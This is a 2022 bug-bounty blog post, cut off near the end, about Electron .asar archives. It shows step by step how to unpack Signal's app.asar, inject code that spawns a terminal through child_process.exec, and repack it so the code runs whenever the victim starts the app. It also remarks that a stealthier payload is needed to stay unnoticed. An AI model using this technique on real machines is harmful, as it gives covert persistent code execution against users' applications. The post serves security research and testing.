---
title: Bug Bounty Tips and Getting Persistence With Electron Applications
url: https://infosecwriteups.com/bug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2022-11-23
fetch_date: 2025-10-03T23:29:30.477230
---

# Bug Bounty Tips and Getting Persistence With Electron Applications

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fc538d4dda446&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fbug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-c538d4dda446---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-c538d4dda446---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Bug Bounty Tips and Getting Persistence With Electron Applications

## By repacking asar files, electron applications, and other bug bounty tips. Starring Signal, Discord, Nordpass, and more

[![bob van der staak](https://miro.medium.com/v2/da:true/resize:fill:64:64/0*ewvf1doH9wqoWybe)](https://bobvanderstaak.medium.com/?source=post_page---byline--c538d4dda446---------------------------------------)

[bob van der staak](https://bobvanderstaak.medium.com/?source=post_page---byline--c538d4dda446---------------------------------------)

5 min read

·

Nov 22, 2022

--

Listen

Share

With the discord DLL hijacking vulnerability, I noticed a new file type that I couldn’t place **.asar.** This write-up explains asar files, how you can gain easy persistence with them and how to find other vulnerabilities in them.

## What are .asar files.

But first what are .asar files and where is it used for. The following GitHub page gives some explanation:

[## GitHub - electron/asar: Simple extensive tar-like archive format with indexing

### Simple extensive tar-like archive format with indexing - GitHub - electron/asar: Simple extensive tar-like archive…

github.com](https://github.com/electron/asar?source=post_page-----c538d4dda446---------------------------------------)

It is an archive format specially for Electron archives. It is possible to pack your application in this format which can later be used to run your Electron npm application.

The interesting is the unpack and pack feature. Which makes it possible to pack and unpack a .asar file and therefore inspect the application. A new attack method began.

### Possible targets

First I started looking for applications, next to discord, that make use of the asar file extension. I found a few on my machine:

1. Slack
2. Teams
3. Signal
4. Nordpass
5. Postman
6. Dropbox

All except dropbox have these files located in %Appdata%/local directory so these are writeable for the given user. Dropbox has it located inside the Program Files directory, which is harder to manipulate for normal users and therefore not a real target.

Because I already had npm installed on my device I was ready to go. In this write-up I will take signal as an example but it works for all tested applications.

## Unpacking signals .asar file

The asar file for Signal is located at **%APPDATA%\Local\Programs\signal-desktop\resources**

from there it is possible to run the following command to extract the app.asar file and write its contents to a folder called destfolder

```
npx asar extract app.asar destfolder
```

As seen below this unpacks the Signal application and shows the complete client application software. This gave room for multiple tests. The first in mind: Persistence. Can we add arbitrary code, repack it and run it without the application checking for errors, or that windows defender or Bitdefender getting alerted?

Press enter or click to view image in full size

![]()

### Gaining persistence

With a quick google search, I found some [code](https://github.com/parsiya/evil-electron/blob/master/preload.js) for an evil electron application. The code used is dictated below.

```
// Detect the operating system.
var platform = require('process').platform;

// Commands
const win32Command = "start cmd.exe";
const darwinCommand = "'/System/Applications/Terminal.app/Contents/MacOS/Terminal',function(){}";
const linuxCommand = "gnome-terminal"; // Issue#2: Find a `universal` Linux command.

var command = "";

console.log(`Running on ${platform}`);

switch (platform) {
    case "win32":
        command = win32Command;
        break;
    case "darwin":
        command = darwinCommand;
        break;
    case "linux":
        command = linuxCommand;
        break;
}

console.log(`Command to be executed: '${command}'`);

if (command === "") {
    console.log(`Operating system '${platform}' is not supported.`);
} else {
    // Spawn a command prompt.
    require('child_process').exec(command);
}
```

Based on the operating system used by the victim this application will spawn the required terminal. Lovely cross-platform execution.

In the extracted folder I searched for package.json which would give information about the start function of the application.

![]()

In Signals instance, the main application is located in app/main.js. I added the “Evil Electron” code inside the applications. **“show window”** function and declared the variables above.

Press enter or click to view image in full size

![]()

And repacked the changed destfolder with the following command:

```
npx asar pack destfolder app.asar
```

Now, whenever the victim starts Signal it will start up a cmd window separately from Signal. It will also not be a child of the Signal process but will be a process without a parent.

![]()

Of course in the current state, the victim will pick up that there is a cmd shell starting and a more silent approach should be implemented.

Even when npm is not already installed on the target system an evil copy of app.asar can be used to override the application. Even when the application in question is already in use! It will not give any error or warning.

### Other types of attacks for Bugbounty’s

The above attack is frankly more for persistence however the applications can also be tested in different methods:

For finding secrets you can use the wordlist below

<https://gist.githubusercontent.com/EdOverflow/8bd2faad513626c413b8fc6e9d955669/raw/06a0ef0fd83920d513c65767aae258ecf8382bdf/gistfile1.txt>

For security scanning the application, you can use electronegativity. This application will scan the application for default errors.
<https://github.com/doyensec/electronegativity>

Of course, you can also try to enable devtools and intercept traffic. Which is more explained in the following write-up.

<https://blog.doyensec.com/2018/07/19/instrumenting-electron-app.html>.

And if you are able to open dev tools. *...